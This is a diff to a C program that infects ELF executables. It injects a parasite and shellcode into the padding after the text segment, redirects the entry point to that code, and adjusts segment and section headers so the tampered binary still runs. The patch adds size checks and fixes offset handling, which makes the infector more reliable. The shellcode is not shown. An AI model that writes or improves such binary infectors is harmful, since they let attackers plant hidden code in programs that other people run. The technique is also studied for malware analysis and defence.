@@ -54,6 +54,7 @@ int main(int argc, char * argv[]){
 
 	struct stat stat;
 
+
 	//open file to be injected for manipulation
 	if((fp = fopen(argv[1],"r")) == NULL)
 		goto file_to_inject_open_error;	
@@ -73,8 +74,9 @@ int main(int argc, char * argv[]){
 
 	//In ELF header, increase e_shoff by PAGE_SIZE 
   puts("[01] Increasing e_shoff by PAGE_SIZE in ELF header...");
+  int segment_size_increase = PAGE_SIZE;
   printf("header e_shoff changed from %x to ",elf_header->e_shoff);
-	elf_header->e_shoff = elf_header->e_shoff + PAGE_SIZE;
+	elf_header->e_shoff = elf_header->e_shoff + segment_size_increase;
   printf("%x\n",elf_header->e_shoff);
 		
 	//patch code to be inserted to jump to original entry point
@@ -95,10 +97,20 @@ int main(int argc, char * argv[]){
 		}
 	}
 
+  int parasite_length = PARASITE_SIZE + shellcode->size;
+	new_code_address = program_headers[text_segment_index]->p_vaddr + program_headers[text_segment_index]->p_filesz;	
+  int padding_length = segment_size_increase - (new_code_address & (segment_size_increase - 1));
+
+  print_val("Padding length",padding_length);
+
+  if(padding_length < parasite_length){
+    puts("Error: Parasite too large!");
+    exit(1);
+  } 
+
 	//Modify e_entry, in the elf header, to point to new code.
   puts("[03][a] Modifying entry point of ELF header to point to new code...");
   printf("elf header entry point changed from %x to ",elf_header->e_entry);
-	new_code_address = program_headers[text_segment_index]->p_vaddr + program_headers[text_segment_index]->p_filesz;	
 	elf_header->e_entry = new_code_address;
   printf("%x.\n",elf_header->e_entry);
 	
@@ -107,30 +119,36 @@ int main(int argc, char * argv[]){
 	
 	
 	//we need the filesz for offset
-	int offset=program_headers[text_segment_index]->p_offset+program_headers[text_segment_index]->p_filesz;
+	//int offset=program_headers[text_segment_index]->p_offset+program_headers[text_segment_index]->p_filesz;
+  //This is the offset from the beginning of the file where the parasite will be injected.
+  int parasite_injection_offset = program_headers[text_segment_index]->p_offset + program_headers[text_segment_index]->p_filesz;
 
 	//increase p_filesz to account for new code
   puts("[03][b] Increasing p_filesz by size of new code...");
   printf("program header filesz changed from %x to ",program_headers[text_segment_index]->p_filesz);
-	unsigned int new_p_filesz = program_headers[text_segment_index]->p_filesz + shellcode->size + PARASITE_SIZE;
+	unsigned int new_p_filesz = program_headers[text_segment_index]->p_filesz + parasite_length;
 	program_headers[text_segment_index]->p_filesz = new_p_filesz;
   printf("%x.\n",program_headers[text_segment_index]->p_filesz);
 	
 	//increase p_memsz to account for new code
   puts("[03][c] Increasing p_memsz by size of new code...");
   printf("program header memsz changed from %x to ",program_headers[text_segment_index]->p_memsz);
-	unsigned int new_p_memsz = program_headers[text_segment_index]->p_memsz + shellcode->size + PARASITE_SIZE;
+	unsigned int new_p_memsz = program_headers[text_segment_index]->p_memsz + parasite_length;
 	program_headers[text_segment_index]->p_memsz = new_p_memsz;
 	printf("%x.\n",program_headers[text_segment_index]->p_memsz);
 
 	//For each phdr who's segment is after the insertion -- increase p_offset
 	//by PAGE_SIZE ???
 	
-	printf("The offset is 0x%x (%d)\n", offset,offset);
+	//printf("The offset is 0x%x (%d)\n", offset,offset);
+  puts("[04] For each Phdr who's segment is after the parasite insertion...");
 	for(int i=(text_segment_index+1); i<elf_header->e_phnum; i++){
-    if(program_headers[i]->p_offset > offset){
+    //if the program headers come after the section in which the insertion took place...
+    if(program_headers[i]->p_offset > parasite_injection_offset){
+      //then they need to have their addressed changed to reflect the shift
+      puts("[04][a] Increasing p_offset by increased PAGE_SIZE...");
       printf("program_header[%d] offset changed from %x to ",i,program_headers[i]->p_offset);
-		  program_headers[i]->p_offset += PAGE_SIZE;
+		  program_headers[i]->p_offset += segment_size_increase;
       printf("%x.\n",program_headers[i]->p_offset);
     }
 	}
@@ -144,12 +162,18 @@ int main(int argc, char * argv[]){
 	
 	//For each pphdr who's segment is after the insertion -- increase p_offset
 	//by PAGE_SIZE ???
+  puts("[06] For each Shdr who's section is after the insertion...");
 	for(int i=0;i<elf_header->e_shnum; i++){
-		if(section_headers[i]->sh_offset > offset){
+		if(section_headers[i]->sh_offset >= parasite_injection_offset){
+      puts("[06][a] Increasing sh_offset by PAGE_SIZE...");
       printf("section header[%d] changed from %x to ",i,section_headers[i]->sh_offset);
-			section_headers[i]->sh_offset += PAGE_SIZE;
+			section_headers[i]->sh_offset += segment_size_increase;
       printf("%x.\n",section_headers[i]->sh_offset);
 		}
+    else if(section_headers[i]->sh_addr + section_headers[i]->sh_size == new_code_address){
+     puts("[05] Increasing sh_len by the parasite length for the last Shdr in the text segment..."); 
+     section_headers[i]->sh_size += parasite_length;
+    }
     else{
         //printf("ignoring section header[%d]. sh_offset=%d(0x%x).\n",i,section_headers[i]->sh_offset,section_headers[i]->sh_offset);
     }
@@ -193,11 +217,11 @@ int main(int argc, char * argv[]){
 	lseek(fd, position=elf_header->e_ehsize+(elf_header->e_phentsize*elf_header->e_phnum), SEEK_SET);
 	
   printf("copying headers to new file...\n");
-	printf("-- offset is:%d\n",offset);
+	//printf("-- offset is:%d\n",offset);
 	printf("-- position is %d\n",position);
-	printf("-- offset-position is:%d (0x%x)\n",offset-position,offset-position);
-  printf("-- prog_header[]->p_offset + offset - position is: %d\n",(program_headers[text_segment_index]->p_offset + offset) - position);
-	copy_partial(fd, infected_descriptor, (program_headers[text_segment_index]->p_offset + offset)-position);
+	//printf("-- offset-position is:%d (0x%x)\n",offset-position,offset-position);
+  //printf("-- prog_header[]->p_offset + offset - position is: %d\n",(program_headers[text_segment_index]->p_offset + offset) - position);
+	copy_partial(fd, infected_descriptor, (program_headers[text_segment_index]->p_offset + parasite_injection_offset)-position);
 	
 	//insert the shellcode
 	write(infected_descriptor,parasite,PARASITE_SIZE);
